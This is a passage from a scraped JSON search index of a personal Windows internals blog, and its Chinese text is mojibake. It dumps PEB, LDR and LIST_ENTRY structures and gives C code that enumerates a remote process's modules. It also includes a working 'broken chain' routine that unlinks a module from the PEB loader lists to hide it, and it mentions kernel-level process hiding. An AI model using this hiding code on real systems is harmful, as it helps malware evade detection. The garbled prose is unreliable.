FastPebUnlockRoutine : Ptr32 Void +0x028 EnvironmentUpdateCount : Uint4B +0x02c KernelCallbackTable : Ptr32 Void ... ... 1.2.3. ldrçš„ç»“æ„ä½“ï¼š_PEB_LDR_DATA 123456789kd&gt; dt _PEB_LDR_DATAntdll!_PEB_LDR_DATA +0x000 Length : Uint4B +0x004 Initialized : UChar +0x008 SsHandle : Ptr32 Void +0x00c InLoadOrderModuleList : _LIST_ENTRY // æ¨¡å—åŠ è½½é¡ºåºé“¾è¡¨ +0x014 InMemoryOrderModuleList : _LIST_ENTRY // æ¨¡å—åœ¨å†…å­˜ä¸­çš„é¡ºåºé“¾è¡¨ +0x01c InInitializationOrderModuleList : _LIST_ENTRY // æ¨¡å—åˆå§‹åŒ–çš„é¡ºåºé“¾è¡¨ +0x024 EntryInProgress : Ptr32 Void 1.2.4. _LIST_ENTRY çš„ç»“æ„ä½“ï¼š åæ–‡ç»“æ„ä½“å¼ºè½¬å°±æ˜¯å› ä¸º Blink ç›´æ¥è¿”å›çš„æ˜¯ _LDR_DATA_TABLE_ENTRY çš„é¦–åœ°å€ã€‚ 1234kd&gt; dt _LIST_ENTRYntdll!_LIST_ENTRY +0x000 Flink : Ptr32 _LIST_ENTRY // æŒ‡å‘å‰é©±èŠ‚ç‚¹çš„æŒ‡é’ˆ +0x004 Blink : Ptr32 _LIST_ENTRY // æŒ‡å‘åç»§èŠ‚ç‚¹çš„æŒ‡é’ˆ 1.2.5. è¡¥å……ï¼š_LDR_DATA_TABLE_ENTRY ç»“æ„ä½“ å­˜å‚¨dllæ¨¡å—çš„ä¿¡æ¯ 1234567891011121314151617181920kd&gt; dt _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY // _LIST_ENTRYç»“æ„ä½“ä¸­Flinkæˆ–BlinkæŒ‡å‘çš„ä½ç½® +0x008 InMemoryOrderLinks : _LIST_ENTRY +0x010 InInitializationOrderLinks : _LIST_ENTRY +0x018 DllBase : Ptr32 Void // dllåŸºå€ +0x01c EntryPoint : Ptr32 Void +0x020 SizeOfImage : Uint4B +0x024 FullDllName : _UNICODE_STRING +0x02c BaseDllName : _UNICODE_STRING // dllåç§° +0x034 Flags : Uint4B +0x038 LoadCount : Uint2B +0x03a TlsIndex : Uint2B +0x03c HashLinks : _LIST_ENTRY +0x03c SectionPointer : Ptr32 Void +0x040 CheckSum : Uint4B +0x044 TimeDateStamp : Uint4B +0x044 LoadedImports : Ptr32 Void +0x048 EntryPointActivationContext : Ptr32 Void +0x04c PatchInformation : Ptr32 Void 1.3. Demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;typedef struct _UNICODE_STRING&#123; USHORT Length; //å­—ç¬¦ä¸²é•¿åº¦ USHORT MaximumLength; //å­—ç¬¦ä¸²æœ€å¤§é•¿åº¦ PWSTR Buffer; //åŒå­—èŠ‚å­—ç¬¦ä¸²æŒ‡é’ˆ&#125; UNICODE_STRING, * PUNICODE_STRING;typedef struct _PEB_LDR_DATA&#123; ULONG Length; BOOLEAN Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; //ä»£è¡¨æŒ‰åŠ è½½é¡ºåºæ„æˆçš„æ¨¡å—åˆ—è¡¨ LIST_ENTRY InMemoryOrderModuleList; //ä»£è¡¨æŒ‰å†…å­˜é¡ºåºæ„æˆçš„æ¨¡å—åˆ—è¡¨ LIST_ENTRY InInitializationOrderModuleList; //ä»£è¡¨æŒ‰åˆå§‹åŒ–é¡ºåºæ„æˆçš„æ¨¡å—é“¾è¡¨&#125;PEB_LDR_DATA, * PPEB_LDR_DATA;typedef struct _LDR_DATA_TABLE_ENTRY&#123; LIST_ENTRY InLoadOrderModuleList; //ä»£è¡¨æŒ‰åŠ è½½é¡ºåºæ„æˆçš„æ¨¡å—åˆ—è¡¨ LIST_ENTRY InMemoryOrderModuleList; //ä»£è¡¨æŒ‰å†…å­˜é¡ºåºæ„æˆçš„æ¨¡å—åˆ—è¡¨ LIST_ENTRY InInitializeationOrderModuleList; //ä»£è¡¨æŒ‰åˆå§‹åŒ–é¡ºåºæ„æˆçš„æ¨¡å—é“¾è¡¨ PVOID DllBase; //è¯¥æ¨¡å—çš„åŸºåœ°å€ PVOID EntryPoint; //è¯¥æ¨¡å—çš„å…¥å£ ULONG SizeOfImage; //è¯¥æ¨¡å—çš„å½±åƒå¤§å° UNICODE_STRING FullDllName; //æ¨¡å—çš„å®Œæ•´è·¯å¾„ UNICODE_STRING BaseDllName; //æ¨¡å—å ULONG Flags; SHORT LoadCount; SHORT TlsIndex; HANDLE SectionHandle; ULONG CheckSum; ULONG TimeDataStamp;&#125;LDR_MODULE, * PLDR_MODULE;PEB_LDR_DATA* g_pPebLdr = NULL;LDR_MODULE* g_pLdrModule = NULL;LIST_ENTRY* g_pInLoadOrderModule;LIST_ENTRY* g_pInMemoryOrderModule;LIST_ENTRY* g_pInInitializeationOrderModule;void ring3BrokenChains(HMODULE hModule)&#123; LIST_ENTRY* pHead = g_pInLoadOrderModule; LIST_ENTRY* pCur = pHead; do &#123; pCur = pCur-&gt;Blink; g_pLdrModule = (PLDR_MODULE)pCur; // è¿™é‡Œä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥å°†pCurè½¬ä¸ºPLDR_MODULEï¼Œè§ä¸‹é¢ä»£ç è§£é‡Š // è¿™æ˜¯å› ä¸º pCur æŒ‡å‘ _LIST_ENTRY ç»“æ„ä½“ï¼ŒæŒ‡å‘çš„åœ°å€åˆšå¥½æ˜¯_LDR_DATA_TABLE_ENTRYçš„é¦–åœ°å€ï¼Œå› æ­¤äºŒè€…åœ¨å†…å­˜ä¸Šåˆšå¥½æ˜¯å¯¹é½çš„ã€‚ // CONTAINING_RECORDè¿™ä¸ªå®è¿”å›æˆå‘˜å˜é‡æ‰€åœ¨ç»“æ„ä½“çš„åŸºå€ï¼Œldte == g_pLdrModule // PLDR_MODULE ldte = CONTAINING_RECORD(pCur, _LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList); if (hModule == g_pLdrModule-&gt;DllBase) &#123; g_pLdrModule-&gt;InLoadOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InLoadOrderModuleList.Flink; g_pLdrModule-&gt;InLoadOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InLoadOrderModuleList.Blink; g_pLdrModule-&gt;InInitializeationOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InInitializeationOrderModuleList.Flink; g_pLdrModule-&gt;InInitializeationOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InInitializeationOrderModuleList.Blink; g_pLdrModule-&gt;InMemoryOrderModuleList.Blink-&gt;Flink = g_pLdrModule-&gt;InMemoryOrderModuleList.Flink; g_pLdrModule-&gt;InMemoryOrderModuleList.Flink-&gt;Blink = g_pLdrModule-&gt;InMemoryOrderModuleList.Blink; break; &#125; &#125; while (pHead != pCur);&#125;int main(int argc, char* argv[])&#123; __asm &#123; mov eax, fs: [0x30] ; // PPEB mov ecx, [eax + 0xC]; // ldr mov g_pPebLdr, ecx; mov ebx, ecx; add ebx, 0xC; mov g_pInLoadOrderModule, ebx; // ç¬¬1ä¸ªé“¾è¡¨ mov ebx, ecx; add ebx, 0x14; mov g_pInMemoryOrderModule, ebx; // ç¬¬2ä¸ªé“¾è¡¨ mov ebx, ecx; add ebx, 0x1C; mov g_pInInitializeationOrderModule, ebx; // ç¬¬3ä¸ªé“¾è¡¨ &#125; printf(&quot;ç‚¹ä»»æ„æŒ‰é”®å¼€å§‹æ–­é“¾&quot;); getchar(); ring3BrokenChains(GetModuleHandleA(&quot;kernel32.dll&quot;)); printf(&quot;æ–­é“¾æˆåŠŸ\\n&quot;); getchar(); return 0;&#125; 2. 0ç¯æ–­é“¾(EPROCESSæ–­é“¾) ä½œç”¨ï¼š0ç¯æ–­é“¾é€šå¸¸ç”¨äºåœ¨å†…æ ¸å±‚éšè—è¿›ç¨‹ 2.1. 1 æ­¥éª¤è¯´æ˜ è·å–è¿›ç¨‹æ¨¡å—çš„æ­¥éª¤ä¸ºï¼š è·å– _KPCR è·å– _KPRCB è·å– _KTHREAD è·å– _KAPC_STATE è·å– _KPROCESS è·å– _EPROCESS è¯¦ç»†æ­¥éª¤è¯´æ˜ï¼š [todo]","tags":[{"name":"PEB","slug":"PEB","permalink":"https://hodlyounger.github.io/tags/PEB/"},{"name":"TEB","slug":"TEB","permalink":"https://hodlyounger.github.io/tags/TEB/"},{"name":"LDR","slug":"LDR","permalink":"https://hodlyounger.github.io/tags/LDR/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"win","slug":"A-OS/Windows/win","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/win/"}]},{"title":"ã€windowsã€‘WOW64é€šè¿‡PEBè·å–32/64ä½è¿›ç¨‹æ¨¡å—ä¿¡æ¯","date":"2024-01-23T06:08:14.139Z","path":"A_OS/Windows/win/ã€winã€‘é€šè¿‡PEBè·å–è¿›ç¨‹æ¨¡å—ä¿¡æ¯/","text":"æ¦‚è¿°ï¼šè·å–è¿›ç¨‹æ¨¡å—ä¿¡æ¯ï¼ŒPEBè¯´æ˜ï¼Œè·å–è¿›ç¨‹ç¯å¢ƒå˜é‡ èƒŒæ™¯ï¼šWindows ä¸‹æ²¡æœ‰èƒ½ api èƒ½ç›´æ¥è¯»å–è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚ wmi å’Œ powershell ä¹Ÿæ²¡æœ‰æ–¹å¼èƒ½è¯»å–è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚ åœ¨ powershell 5.1 é‡Œç¡®å®å¯ä»¥é€šè¿‡è±¡è¿™æ ·çš„å‘½ä»¤è¯»å–ç¯å¢ƒå˜é‡ï¼Œä½†è¿™å¹¶ä¸æ˜¯è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚ è¿›ç¨‹çš„PEB Windows ä¸‹åªèƒ½é€šè¿‡ PEB æ¥è¯»å–ç¯å¢ƒå˜é‡ã€‚PEB æ˜¯ä¸€ä¸ªæ¯”è¾ƒåºå¤§ä¸”å¤æ‚çš„ç»“æ„ä½“ï¼Œå¾®è½¯å®˜æ–¹ä¹Ÿæ²¡æœ‰ç»™å‡ºè¿™ä¸ªç»“æ„ä½“çš„è¯¦ç»†ä¿¡æ¯ã€‚PEB çš„å…·ä½“ç»“æ„æ ¹æ®æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬ä¸åŒè€Œä¸åŒï¼Œä¹Ÿå’Œè¿›ç¨‹çš„ä½æ•°æœ‰å…³ã€‚PEB é‡Œé™¤äº†ç¯å¢ƒå˜é‡ï¼Œè¿˜æœ‰æ‰§è¡Œç›®å½•ï¼Œå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œå‘½ä»¤è¡Œç­‰ä¿¡æ¯ã€‚ æœ‰å…³ PEB ç»“æ„ä½“å†…å®¹çš„ï¼Œæœ‰å›½å¤–å¤§ç¥å¼€æºçš„ç»“æœï¼šTerminus Project Terminus Project - _PEB - x86 view Terminus Project - _PEB - x64 view Demo æŸ¥è¯¢è¿›ç¨‹ PEB 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265#include &lt;stdio.h&gt;#include &quot;windows.h&quot; #define NT_SUCCESS(x) ((x) &gt;= 0)#define ProcessBasicInformation 0 typedef NTSTATUS(NTAPI *pfnNtWow64QueryInformationProcess64)( IN HANDLE ProcessHandle, IN ULONG ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL ); typedef NTSTATUS(NTAPI *pfnNtWow64ReadVirtualMemory64)( IN HANDLE ProcessHandle, IN PVOID64 BaseAddress, OUT PVOID Buffer, IN ULONG64 Size, OUT PULONG64 NumberOfBytesRead ); typedefNTSTATUS(WINAPI *pfnNtQueryInformationProcess)(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, UINT32 ProcessInformationLength, UINT32* ReturnLength); typedef struct _PROCESS_BASIC_INFORMATION32 &#123; NTSTATUS ExitStatus; UINT32 PebBaseAddress; UINT32 AffinityMask; UINT32 BasePriority; UINT32 UniqueProcessId; UINT32 InheritedFromUniqueProcessId;&#125; PROCESS_BASIC_INFORMATION32; typedef struct _UNICODE_STRING32&#123; USHORT Length; USHORT MaximumLength; PWSTR Buffer;&#125; UNICODE_STRING32, *PUNICODE_STRING32; typedef struct _PEB32&#123; UCHAR InheritedAddressSpace; UCHAR ReadImageFileExecOptions; UCHAR BeingDebugged; UCHAR BitField; ULONG Mutant; ULONG ImageBaseAddress; ULONG Ldr; ULONG ProcessParameters; ULONG SubSystemData; ULONG ProcessHeap; ULONG FastPebLock; ULONG AtlThunkSListPtr; ULONG IFEOKey; ULONG CrossProcessFlags; ULONG UserSharedInfoPtr; ULONG SystemReserved; ULONG AtlThunkSListPtr32; ULONG ApiSetMap;&#125; PEB32, *PPEB32; typedef struct _PEB_LDR_DATA32&#123; ULONG Length; BOOLEAN Initialized; ULONG SsHandle; LIST_ENTRY32 InLoadOrderModuleList; LIST_ENTRY32 InMemoryOrderModuleList; LIST_ENTRY32 InInitializationOrderModuleList; ULONG EntryInProgress;&#125; PEB_LDR_DATA32, *PPEB_LDR_DATA32; typedef struct _LDR_DATA_TABLE_ENTRY32&#123; LIST_ENTRY32 InLoadOrderLinks; LIST_ENTRY32 InMemoryOrderModuleList; LIST_ENTRY32 InInitializationOrderModuleList; ULONG DllBase; ULONG EntryPoint; ULONG SizeOfImage; UNICODE_STRING32 FullDllName; UNICODE_STRING32 BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; union &#123; LIST_ENTRY32 HashLinks; ULONG SectionPointer; &#125;; ULONG CheckSum; union &#123; ULONG TimeDateStamp; ULONG LoadedImports; &#125;; ULONG EntryPointActivationContext; ULONG PatchInformation;&#125; LDR_DATA_TABLE_ENTRY32, *PLDR_DATA_TABLE_ENTRY32; typedef struct _PROCESS_BASIC_INFORMATION64 &#123; NTSTATUS ExitStatus; UINT32 Reserved0; UINT64 PebBaseAddress; UINT64 AffinityMask; UINT32 BasePriority; UINT32 Reserved1; UINT64 UniqueProcessId; UINT64 InheritedFromUniqueProcessId;&#125; PROCESS_BASIC_INFORMATION64;typedef struct _PEB64&#123; UCHAR InheritedAddressSpace; UCHAR ReadImageFileExecOptions; UCHAR BeingDebugged; UCHAR BitField; ULONG64 Mutant; ULONG64 ImageBaseAddress; ULONG64 Ldr; ULONG64 ProcessParameters; ULONG64 SubSystemData; ULONG64 ProcessHeap; ULONG64 FastPebLock; ULONG64 AtlThunkSListPtr; ULONG64 IFEOKey; ULONG64 CrossProcessFlags; ULONG64 UserSharedInfoPtr; ULONG SystemReserved; ULONG AtlThunkSListPtr32; ULONG64 ApiSetMap;&#125; PEB64, *PPEB64; typedef struct _PEB_LDR_DATA64&#123; ULONG Length; BOOLEAN Initialized; ULONG64 SsHandle; LIST_ENTRY64 InLoadOrderModuleList; LIST_ENTRY64 InMemoryOrderModuleList; LIST_ENTRY64 InInitializationOrderModuleList; ULONG64 EntryInProgress;&#125; PEB_LDR_DATA64, *PPEB_LDR_DATA64; typedef struct _UNICODE_STRING64&#123; USHORT Length; USHORT MaximumLength; ULONG64 Buffer;&#125; UNICODE_STRING64, *PUNICODE_STRING64; typedef struct _LDR_DATA_TABLE_ENTRY64&#123; LIST_ENTRY64 InLoadOrderLinks; LIST_ENTRY64 InMemoryOrderModuleList; LIST_ENTRY64 InInitializationOrderModuleList; ULONG64 DllBase; ULONG64 EntryPoint; ULONG SizeOfImage; UNICODE_STRING64 FullDllName; UNICODE_STRING64 BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; union &#123; LIST_ENTRY64 HashLinks; ULONG64 SectionPointer; &#125;; ULONG CheckSum; union &#123; ULONG TimeDateStamp; ULONG64 LoadedImports; &#125;; ULONG64 EntryPointActivationContext; ULONG64 PatchInformation;&#125; LDR_DATA_TABLE_ENTRY64, *PLDR_DATA_TABLE_ENTRY64; int main()&#123; DWORD dwPid = 4480; HANDLE m_ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid); BOOL bTarget = FALSE; BOOL bSource = FALSE; IsWow64Process(GetCurrentProcess(), &amp;bSource); IsWow64Process(m_ProcessHandle, &amp;bTarget); SYSTEM_INFO si; GetSystemInfo(&amp;si); if (bTarget == FALSE &amp;&amp; bSource == TRUE) &#123; HMODULE NtdllModule = GetModuleHandle(L&quot;ntdll.dll&quot;); pfnNtWow64QueryInformationProcess64 NtWow64QueryInformationProcess64 = (pfnNtWow64QueryInformationProcess64)GetProcAddress(NtdllModule, &quot;NtWow64QueryInformationProcess64&quot;); pfnNtWow64ReadVirtualMemory64 NtWow64ReadVirtualMemory64 = (pfnNtWow64ReadVirtualMemory64)GetProcAddress(NtdllModule, &quot;NtWow64ReadVirtualMemory64&quot;); PROCESS_BASIC_INFORMATION64 pbi64 = &#123; 0 &#125;; if (NT_SUCCESS(NtWow64QueryInformationProcess64(m_ProcessHandle, ProcessBasicInformation, &amp;pbi64, sizeof(pbi64), NULL))) &#123; DWORD64 Ldr64 = 0; LIST_ENTRY64 ListEntry64 = &#123; 0 &#125;; LDR_DATA_TABLE_ENTRY64 LDTE64 = &#123; 0 &#125;; wchar_t ProPath64[256]; if (NT_SUCCESS(NtWow64ReadVirtualMemory64(m_ProcessHandle, (PVOID64)(pbi64.PebBaseAddress + offsetof(PEB64, Ldr)), &amp;Ldr64, sizeof(Ldr64), NULL))) &#123; if (NT_SUCCESS(NtWow64ReadVirtualMemory64(m_ProcessHandle, (PVOID64)(Ldr64 + offsetof(PEB_LDR_DATA64, InLoadOrderModuleList)), &amp;ListEntry64, sizeof(LIST_ENTRY64), NULL))) &#123; if (NT_SUCCESS(NtWow64ReadVirtualMemory64(m_ProcessHandle, (PVOID64)(ListEntry64.Flink), &amp;LDTE64, sizeof(_LDR_DATA_TABLE_ENTRY64), NULL))) &#123; while (1) &#123; if (LDTE64.InLoadOrderLinks.Flink == ListEntry64.Flink) break; if (NT_SUCCESS(NtWow64ReadVirtualMemory64(m_ProcessHandle, (PVOID64)LDTE64.FullDllName.Buffer, ProPath64, sizeof(ProPath64), NULL))) &#123; printf(&quot;æ¨¡å—åŸºå€:0x%llX\\næ¨¡å—å¤§å°:0x%X\\næ¨¡å—è·¯å¾„:%ls\\n&quot;, LDTE64.DllBase, LDTE64.SizeOfImage, ProPath64); &#125; if (!NT_SUCCESS(NtWow64ReadVirtualMemory64(m_ProcessHandle, (PVOID64)LDTE64.InLoadOrderLinks.Flink, &amp;LDTE64, sizeof(_LDR_DATA_TABLE_ENTRY64), NULL))) break; &#125; &#125; &#125; &#125; &#125; &#125; else if (bTarget == TRUE &amp;&amp; bSource == TRUE || si.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_IA64) &#123; HMODULE NtdllModule = GetModuleHandle(L&quot;ntdll.dll&quot;); pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(NtdllModule, &quot;NtQueryInformationProcess&quot;); PROCESS_BASIC_INFORMATION32 pbi32 = &#123; 0 &#125;; if (NT_SUCCESS(NtQueryInformationProcess(m_ProcessHandle, ProcessBasicInformation, &amp;pbi32, sizeof(pbi32), NULL))) &#123; DWORD Ldr32 = 0; LIST_ENTRY32 ListEntry32 = &#123; 0 &#125;; LDR_DATA_TABLE_ENTRY32 LDTE32 = &#123; 0 &#125;; wchar_t ProPath32[256]; if (ReadProcessMemory(m_ProcessHandle, (PVOID)(pbi32.PebBaseAddress + offsetof(PEB32, Ldr)), &amp;Ldr32, sizeof(Ldr32), NULL)) &#123; if (ReadProcessMemory(m_ProcessHandle, (PVOID)(Ldr32 + offsetof(PEB_LDR_DATA32, InLoadOrderModuleList)), &amp;ListEntry32, sizeof(LIST_ENTRY32), NULL)) &#123; if (ReadProcessMemory(m_ProcessHandle, (PVOID)(ListEntry32.Flink), &amp;LDTE32, sizeof(_LDR_DATA_TABLE_ENTRY32), NULL)) &#123; while (1) &#123; if (LDTE32.InLoadOrderLinks.Flink == ListEntry32.Flink) break; if (ReadProcessMemory(m_ProcessHandle, (PVOID)LDTE32.FullDllName.Buffer, ProPath32, sizeof(ProPath32), NULL)) &#123; printf(&quot;æ¨¡å—åŸºå€:0x%X\\næ¨¡å—å¤§å°:0x%X\\næ¨¡å—è·¯å¾„:%ls\\n&quot;,LDTE32.DllBase,LDTE32.SizeOfImage,ProPath32); &#125; if (!ReadProcessMemory(m_ProcessHandle, (PVOID)LDTE32.InLoadOrderLinks.Flink, &amp;LDTE32, sizeof(_LDR_DATA_TABLE_ENTRY32), NULL)) break; &#125; &#125; &#125; &#125; &#125; &#125; CloseHandle(m_ProcessHandle); getchar();&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"PEB","slug":"PEB","permalink":"https://hodlyounger.github.io/tags/PEB/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"win","slug":"A-OS/Windows/win","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/win/"}]},{"title":"ã€windowsã€‘è¿›ç¨‹ç›¸å…³ç²¾åæ–‡ç« æ•´ç†","date":"2024-01-23T06:08:14.135Z","path":"A_OS/Windows/è¿›ç¨‹çº¿ç¨‹/ã€winã€‘è¿›ç¨‹ç›¸å…³ç²¾åæ–‡ç« /","text":"PEB ç›¸å…³ åŸºäºPEBæ–­é“¾å®ç°è¿›ç¨‹/æ¨¡å—éšè— - çŸ¥ä¹","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"è¿›ç¨‹çº¿ç¨‹","slug":"A-OS/Windows/è¿›ç¨‹çº¿ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"}]},{"title":"ã€winã€‘è¿›ç¨‹å’Œçº¿ç¨‹æ‹“å±•ï¼ˆå¾®è½¯å®˜æ–¹ï¼‰","date":"2024-01-23T06:08:14.129Z","path":"A_OS/Windows/è¿›ç¨‹çº¿ç¨‹/ã€winã€‘è¿›ç¨‹å’Œçº¿ç¨‹ç›¸å…³æ‹“å±•/","text":"æ¦‚è¿°ï¼šå¾®è½¯å®˜æ–¹æä¾›çš„å…³äºè¿›ç¨‹å’Œçº¿ç¨‹çš„ä¸€äº›demoï¼Œä¸»è¦æ˜¯å’Œè¿›ç¨‹ã€çº¿ç¨‹ç›¸å…³çš„ä¸€äº›å‡½æ•°è¯´æ˜å’Œä½¿ç”¨ å‚è€ƒé“¾æ¥ï¼šè¿›ç¨‹å’Œçº¿ç¨‹ - Win32 apps | Microsoft Learn","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"process","slug":"process","permalink":"https://hodlyounger.github.io/tags/process/"},{"name":"thread","slug":"thread","permalink":"https://hodlyounger.github.io/tags/thread/"},{"name":"teb","slug":"teb","permalink":"https://hodlyounger.github.io/tags/teb/"},{"name":"peb","slug":"peb","permalink":"https://hodlyounger.github.io/tags/peb/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"è¿›ç¨‹çº¿ç¨‹","slug":"A-OS/Windows/è¿›ç¨‹çº¿ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"}]},{"title":"ã€windowsã€‘è·å–è¿›ç¨‹çš„ç¯å¢ƒå˜é‡","date":"2024-01-23T06:08:14.126Z","path":"A_OS/Windows/è¿›ç¨‹çº¿ç¨‹/ã€winã€‘è·å–è¿›ç¨‹ç¯å¢ƒå˜é‡/","text":"æ¦‚è¿°: windows ç³»ç»Ÿä¸‹è·å–è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå¯å‚è€ƒæ–‡ç«  ã€é€šè¿‡PEBè·å–è¿›ç¨‹æ¨¡å—ä¿¡æ¯ã€‘å’Œ æ–‡ç«  ã€PEBã€‘ã€‚ Info PEB: process envirment block TEB: thread envirment block åœ¨ç½‘ä¸Šèƒ½çœ‹åˆ°ç›¸å…³å¼€æºçš„ä»£ç ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯è¯»å–è¿›ç¨‹çš„å†…å­˜ï¼Œå†éå†ç›¸å…³å†…å­˜è·å–ï¼Œè·å–ä¿å­˜è¿›ç¨‹ç¯å¢ƒå˜é‡çš„å—ï¼Œå¾—åˆ°å¯¹åº”çš„ç¯å¢ƒå˜é‡å†…å®¹ã€‚ ç›¸å…³å‡½æ•°åŠç»“æ„äº†è§£ é¦–å…ˆéœ€è¦äº†è§£PEBçš„ç»“æ„ï¼ŒæŸ¥çœ‹PEBå¯ä»¥ä½¿ç”¨windbg å‘½ä»¤æŸ¥çœ‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171: kd&gt; dt _PEBntdll!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar +0x003 BitField : UChar +0x003 ImageUsesLargePages : Pos 0, 1 Bit +0x003 IsProtectedProcess : Pos 1, 1 Bit +0x003 IsImageDynamicallyRelocated : Pos 2, 1 Bit +0x003 SkipPatchingUser32Forwarders : Pos 3, 1 Bit +0x003 IsPackagedProcess : Pos 4, 1 Bit +0x003 IsAppContainer : Pos 5, 1 Bit +0x003 IsProtectedProcessLight : Pos 6, 1 Bit +0x003 IsLongPathAwareProcess : Pos 7, 1 Bit +0x004 Padding0 : [4] UChar +0x008 Mutant : Ptr64 Void +0x010 ImageBaseAddress : Ptr64 Void +0x018 Ldr : Ptr64 _PEB_LDR_DATA +0x020 ProcessParameters : Ptr64 _RTL_USER_PROCESS_PARAMETERS +0x028 SubSystemData : Ptr64 Void +0x030 ProcessHeap : Ptr64 Void +0x038 FastPebLock : Ptr64 _RTL_CRITICAL_SECTION +0x040 AtlThunkSListPtr : Ptr64 _SLIST_HEADER +0x048 IFEOKey : Ptr64 Void +0x050 CrossProcessFlags : Uint4B +0x050 ProcessInJob : Pos 0, 1 Bit +0x050 ProcessInitializing : Pos 1, 1 Bit +0x050 ProcessUsingVEH : Pos 2, 1 Bit +0x050 ProcessUsingVCH : Pos 3, 1 Bit +0x050 ProcessUsingFTH : Pos 4, 1 Bit +0x050 ProcessPreviouslyThrottled : Pos 5, 1 Bit +0x050 ProcessCurrentlyThrottled : Pos 6, 1 Bit +0x050 ProcessImagesHotPatched : Pos 7, 1 Bit +0x050 ReservedBits0 : Pos 8, 24 Bits +0x054 Padding1 : [4] UChar +0x058 KernelCallbackTable : Ptr64 Void +0x058 UserSharedInfoPtr : Ptr64 Void +0x060 SystemReserved : Uint4B +0x064 AtlThunkSListPtr32 : Uint4B +0x068 ApiSetMap : Ptr64 Void +0x070 TlsExpansionCounter : Uint4B +0x074 Padding2 : [4] UChar +0x078 TlsBitmap : Ptr64 Void +0x080 TlsBitmapBits : [2] Uint4B +0x088 ReadOnlySharedMemoryBase : Ptr64 Void +0x090 SharedData : Ptr64 Void +0x098 ReadOnlyStaticServerData : Ptr64 Ptr64 Void +0x0a0 AnsiCodePageData : Ptr64 Void +0x0a8 OemCodePageData : Ptr64 Void +0x0b0 UnicodeCaseTableData : Ptr64 Void +0x0b8 NumberOfProcessors : Uint4B +0x0bc NtGlobalFlag : Uint4B +0x0c0 CriticalSectionTimeout : _LARGE_INTEGER +0x0c8 HeapSegmentReserve : Uint8B +0x0d0 HeapSegmentCommit : Uint8B +0x0d8 HeapDeCommitTotalFreeThreshold : Uint8B +0x0e0 HeapDeCommitFreeBlockThreshold : Uint8B +0x0e8 NumberOfHeaps : Uint4B +0x0ec MaximumNumberOfHeaps : Uint4B +0x0f0 ProcessHeaps : Ptr64 Ptr64 Void +0x0f8 GdiSharedHandleTable : Ptr64 Void +0x100 ProcessStarterHelper : Ptr64 Void +0x108 GdiDCAttributeList : Uint4B +0x10c Padding3 : [4] UChar +0x110 LoaderLock : Ptr64 _RTL_CRITICAL_SECTION +0x118 OSMajorVersion : Uint4B +0x11c OSMinorVersion : Uint4B +0x120 OSBuildNumber : Uint2B +0x122 OSCSDVersion : Uint2B +0x124 OSPlatformId : Uint4B +0x128 